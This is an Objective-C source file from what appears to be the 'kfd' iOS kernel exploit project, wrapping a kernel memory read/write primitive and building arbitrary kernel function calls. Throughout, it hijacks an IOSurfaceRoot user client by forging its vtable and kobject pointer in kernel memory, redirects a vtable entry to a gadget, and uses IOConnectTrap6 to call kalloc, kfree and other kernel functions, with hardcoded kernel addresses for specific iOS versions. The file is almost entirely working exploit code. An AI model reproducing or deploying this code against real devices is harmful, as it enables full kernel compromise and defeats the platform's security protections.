//
//  krw.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import "krw.h"
#import "libkfd.h"
#import "offsets.h"

uint64_t _kfd = 0;

uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    printf("do_kopen arg: 0x%llx, 0x%llx, 0x%llx, 0x%llx\n", puaf_pages, puaf_method, kread_method, kwrite_method);
    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);//kopen_intermediate(puaf_pages, puaf_method, kread_method, kwrite_method);
    return _kfd;
}

void do_kclose(void)
{
    kclose(_kfd);
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint64_t get_kslide(void) {
    //kfd->info.kernel.kernel_slide
    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

uint64_t get_kernproc(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

uint64_t zm_fix_addr_kalloc(uint64_t addr) {
    //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8; guess what is that address xD
    uint64_t kmem = 0xFFFFFFF0071024B8 + get_kslide();
    uint64_t zm_alloc = kread64(kmem);    //idk?
    uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;

    return (zm_stripped | ((addr) & 0xffffffff));
}

//Thanks @Mineek!
uint64_t init_kcall(uint64_t *_fake_vtable, uint64_t *_fake_client, mach_port_t *_user_client) {
    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    mach_port_t user_client;
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    uint64_t uc_port = port_name_to_ipc_port(user_client);
    uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF
    uint64_t uc_vtab = kread64(uc_addr);
    uint64_t fake_vtable = off_empty_kdata_page + get_kslide();
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
    }
    uint64_t fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
    }
    kwrite64(fake_client, fake_vtable);
    kwrite64(uc_port + 0x58, fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF
    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);

    *_fake_vtable = fake_vtable;
    *_fake_client = fake_client;
    *_user_client = user_client;

    return 0;
}

uint64_t init_kcall_allocated(uint64_t _fake_vtable, uint64_t _fake_client, mach_port_t *_user_client) {
    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    mach_port_t user_client;
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    uint64_t uc_port = port_name_to_ipc_port(user_client);
    uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF (0x68)
    uint64_t uc_vtab = kread64(uc_addr);
    uint64_t fake_vtable = _fake_vtable;
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
    }
    uint64_t fake_client = _fake_client;
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
    }
    kwrite64(fake_client, fake_vtable);
    kwrite64(uc_port + 0x58, fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF (0x68)
    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);

    *_user_client = user_client;

    return 0;
}

uint64_t kcall(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(fake_client+0x40);
    uint64_t offx28 = kread64(fake_client+0x48);
    kwrite64(fake_client+0x40, x0);
    kwrite64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(fake_client+0x40, offx20);
    kwrite64(fake_client+0x48, offx28);
    return returnval;
}

uint64_t kalloc(mach_port_t user_client, uint64_t fake_client, size_t ksize) {
    uint64_t allocated_kmem = kcall(user_client, fake_client, off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
    return zm_fix_addr_kalloc(allocated_kmem);
}

void kfree(mach_port_t user_client, uint64_t fake_client, uint64_t kaddr, size_t ksize) {
    kcall(user_client, fake_client, off_kfree_data_external + get_kslide(), kaddr, ksize, 0, 0, 0, 0, 0);
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for(int i = 0; i < size; i+=8) {
        kwrite64(addr + i, 0);
    }
    return 0;
}

int kalloc_using_empty_kdata_page(uint64_t* _fake_vtable, uint64_t* _fake_client) {
    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();

    uint64_t fake_vtable, fake_client = 0;
    mach_port_t user_client = 0;
    init_kcall(&fake_vtable, &fake_client, &user_client);

    uint64_t allocated_kmem = kalloc(user_client, fake_client, 0x1000);
    *_fake_vtable = allocated_kmem;

    allocated_kmem = kalloc(user_client, fake_client, 0x1000);
    *_fake_client = allocated_kmem;

    mach_port_deallocate(mach_task_self(), user_client);
    usleep(10000);

    clean_dirty_kalloc(fake_vtable, 0x1000);
    clean_dirty_kalloc(fake_client, 0x1000);

    return 0;
}
